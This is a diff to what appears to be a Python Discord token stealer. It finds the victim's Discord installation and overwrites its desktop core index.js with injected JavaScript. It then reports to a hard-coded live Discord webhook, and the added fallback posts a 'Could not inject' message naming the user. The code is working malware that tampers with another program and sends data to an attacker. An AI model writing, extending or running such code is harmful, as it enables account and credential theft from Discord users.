@@ -69,20 +69,21 @@ except ImportError as e:
         subprocess.run(f"pip install {e}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     finally:
        subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32 requests discord", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-
+hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
 time.sleep(2)
-user = os.getlogin()
-path = f"C:/Users/{user}/APPDATA/Local/Discord/"
-dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
-fdirs = [f for f in dirr if any(os.scandir(os.path.join(path, f)))]
-if 'app' in fdirs[0]:
-    app = fdirs[0]
-else:
-    fdirs.sort()
-    app = fdirs[0]
-mainpath = f"{path}/{app}/modules/discord_desktop_core-1/discord_desktop_core/index.js"
-f = open(mainpath,"w")
-content = """const https = require('https');
+try:
+    user = os.getlogin()
+    path = f"C:/Users/{user}/APPDATA/Local/Discord/"
+    dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
+    fdirs = [f for f in dirr if any(os.scandir(os.path.join(path, f)))]
+    if 'app' in fdirs[0]:
+        app = fdirs[0]
+    else:
+        fdirs.sort()
+        app = fdirs[0]
+    mainpath = f"{path}/{app}/modules/discord_desktop_core-1/discord_desktop_core/index.js"
+    f = open(mainpath,"w")
+    content = """const https = require('https');
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
@@ -120,10 +121,14 @@ if (fs.existsSync(dpath)) {
 
 module.exports = require('./core.asar');
 """
-f.write(content)
-f.close()
-s = open(mainpath,"r")
-hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
+    f.write(content)
+    f.close()
+    s = open(mainpath,"r")
+except:
+    try:
+        requests.post(hook,json={"content": f"Could not inject {user}"})
+    except:
+        pass
 
 def info():
             import json
